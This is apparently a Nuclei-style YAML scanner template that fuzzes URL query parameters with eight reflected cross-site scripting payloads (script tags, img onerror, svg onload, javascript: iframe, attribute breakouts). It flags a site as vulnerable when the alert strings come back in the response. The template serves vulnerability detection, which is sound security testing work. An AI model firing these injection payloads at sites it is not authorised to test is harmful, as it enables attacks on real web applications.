http:
- fuzzing:
  - fuzz:
    - '{{injection}}'
    mode: single
    part: query
    type: replace
  matchers:
  - condition: or
    type: word
    words:
    - <script>alert('XSS')</script>
    - alert('XSS')
    - onerror=alert('XSS')
    - onload=alert('XSS')
  method: GET
  path:
  - '{{BaseURL}}'
  payloads:
    injection:
    - <script>alert('XSS')</script>
    - '''><script>alert(''XSS'')</script>'
    - '"><script>alert(''XSS'')</script>'
    - <img src=x onerror=alert('XSS')>
    - ''';alert(''XSS'');//'
    - '"><svg/onload=alert(''XSS'')>'
    - <iframe src=javascript:alert('XSS')>
    - '"><body onload=alert(''XSS'')>'
  stop-at-first-match: true
id: reflected-xss
info:
  author: KhukuriRimal
  description: Detects reflected XSS vulnerability
  name: Reflected Cross-Site Scripting (XSS)
  severity: Critical
